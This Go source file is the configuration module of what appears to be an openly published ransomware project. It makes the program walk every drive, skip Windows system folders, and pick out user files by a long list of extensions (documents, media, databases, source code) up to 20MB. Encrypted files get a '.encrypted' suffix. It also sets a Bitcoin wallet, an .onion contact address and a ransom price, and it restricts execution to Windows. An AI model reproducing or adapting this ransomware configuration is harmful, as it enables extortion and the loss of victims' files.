package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"

	"github.com/mauri870/ransomware/cryptofs"
	"github.com/mauri870/ransomware/utils"
)

var (
	UserDir = fmt.Sprintf("%s\\", utils.GetCurrentUser().HomeDir)

	// Temp Dir
	TempDir = fmt.Sprintf("%s\\", os.Getenv("TEMP"))

	// Directories to walk searching for files
	// By default it will walk throught all available drives
	InterestingDirs = utils.GetDrives()

	// Folders to skip
	SkippedDirs = []string{
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}

	// Interesting extensions to match files
	InterestingExtensions = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend",
		// Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct", "epub",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
	}

	// Max size allowed to match a file, 20MB by default
	MaxFileSize = int64(20 * 1e+6)

	// Indexer index files and control goroutines execution
	Indexer = struct {
		Files chan *cryptofs.File
		sync.WaitGroup
	}{
		Files: make(chan *cryptofs.File),
	}

	// The logger instance
	Logger = func() *log.Logger {
		// The default destination is os.Stderr, but you can set any io.Writer
		// as the log output. Use ioutil.Discard to ignore the log output
		//
		// Example with a file:
		// f, err := os.OpenFile(TempDir+"example.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		// handle error...
		// return log.New(f, "optional prefix", log.LstdFlags)
		//
		return log.New(os.Stderr, "", log.LstdFlags)
	}()

	// Workers processing the files
	NumWorkers = runtime.NumCPU()

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"

	// Your wallet address
	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"

	// Your contact email
	ContactEmail = "example@ywtpdnpwihbyuvck.onion"

	// The ransom to pay
	Price = "0.345 BTC"
)

// Execute only on windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		Logger.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
